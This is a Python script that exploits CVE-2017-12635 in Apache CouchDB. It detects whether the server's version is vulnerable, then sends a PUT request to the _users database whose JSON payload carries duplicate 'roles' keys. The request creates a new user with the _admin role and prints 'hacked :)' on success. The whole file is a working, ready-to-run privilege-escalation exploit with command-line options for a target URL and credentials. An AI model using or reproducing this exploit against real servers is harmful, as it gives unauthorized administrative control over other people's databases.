import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

class CVE2017_12635:
    headers = {"Content-Type": "application/json"}

    def __init__(self, url, user, pswd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.session = requests.Session()
        self.session.headers = self.headers

    # detect couchdb version
    def detect_version(self):
        print (LogColors.BLUE + "get couchdb version..." + LogColors.ENDC)
        v = self.session.get(self.url).json()["version"]
        vstr = v.replace(".", "")
        v1 = (v[0] == "1" and int(vstr) <= 170)
        v2 = (v[0] == "2" and int(vstr) < 211)
        if v1 or v2:
            print (LogColors.YELLOW + "couchdb version: " + str(v) + LogColors.ENDC)
            self.version = v
        else:
            print (LogColors.RED + "version: " + str(v) + " is not vulnerable. exit :(" + LogColors.ENDC) 
            sys.exit()

    # create new user with admin role
    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        self.detect_version()
        payload = '{"type": "user", "name": "' + self.user + '",'
        payload += '"roles": ["_admin"], "roles": [],'
        payload += '"password": "' + self.pswd + '"}'

        r = self.session.put(
            self.url.rstrip("/") + "/_users//org.couchdb.user:" + self.user,
            data = payload
        )
        if r.ok:
            print (LogColors.YELLOW + self.user + ":" + self.pswd + LogColors.ENDC)
            print (LogColors.GREEN + "successfully create new user. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "create the user failed. exit :(" + LogColors.ENDC)
            sys.exit()
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target url")
    parser.add_argument('-u','--user', required = True, help = "username")
    parser.add_argument('-p','--password', required = True, help = "password")
    args = vars(parser.parse_args())
    url = args['target']
    user, pswd = args['user'], args['password']
    cve = CVE2017_12635(url, user, pswd)
    cve.exploit()

